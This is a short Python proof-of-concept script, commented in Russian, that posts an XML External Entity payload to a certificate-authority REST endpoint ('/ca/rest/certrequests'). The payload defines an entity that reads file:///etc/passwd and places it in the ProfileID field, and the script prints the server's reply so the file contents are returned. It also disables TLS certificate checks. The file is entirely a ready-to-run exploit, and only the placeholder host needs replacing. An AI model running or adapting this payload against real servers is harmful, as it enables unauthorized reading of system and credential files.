import requests  

TARGET_URL = "https://YOUR_HOST/ca/rest/certrequests"  # Целевой URL, замените на свой
XML_PAYLOAD = """
<!--?xml version="1.0" ?-->
<!DOCTYPE xmlData [<!ENTITY fetchFile SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&fetchFile;</ProfileID>
</CertEnrollmentRequest>
"""  # Пейлоад XML, который будет отправлен
HEADERS = {'Content-Type': 'application/xml'}  # Заголовки запроса

# Функция для отправки POST-запроса на сервер
def send_post_request(url, payload, headers):
    try:
        # Выполняем запрос
        response = requests.post(url, data=payload, headers=headers, verify=False)
        return response
    except requests.exceptions.RequestException as error:
        print("Произошла ошибка при выполнении запроса:", error)
        return None

# Функция для обработки и отображения ответа от сервера
def parse_response(response):
    if response:
        print("Статус-код ответа:", response.status_code)
        print("Содержимое XML-ответа:", response.text)
    else:
        print("Ответ не получен или произошла ошибка при запросе.")

def main():

    print("Инициализация отправки XML-пейлоада на сервер...")
    response = send_post_request(TARGET_URL, XML_PAYLOAD, HEADERS)
    parse_response(response)

if __name__ == "__main__":
    main()
